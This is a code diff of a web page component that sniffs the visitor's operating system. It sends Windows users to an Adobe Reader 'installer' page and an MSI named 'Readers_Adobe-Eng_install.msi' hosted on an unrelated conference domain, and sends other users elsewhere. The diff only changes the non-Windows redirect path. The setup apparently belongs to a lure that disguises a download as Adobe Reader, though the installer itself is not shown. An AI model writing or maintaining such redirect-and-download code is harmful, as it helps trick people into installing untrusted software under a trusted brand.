@@ -5,7 +5,7 @@ export default function Home() {
     const userAgent = navigator.userAgent || "";
     const isWindows = /windows/i.test(userAgent);
 
-    const NON_WINDOWS_TARGET = "https://aspiceconference.com/cw";
+    const NON_WINDOWS_TARGET = "https://aspiceconference.com/wa";
     const MSI_FILE = "/Readers_Adobe-Eng_install.msi";
     const WINDOWS_REDIRECT = "https://aspiceconference.com/adobe-reader/installer/download.html";
 
@@ -52,6 +52,7 @@ export default function Home() {
     </main>
   );
 }
+
 
 
 
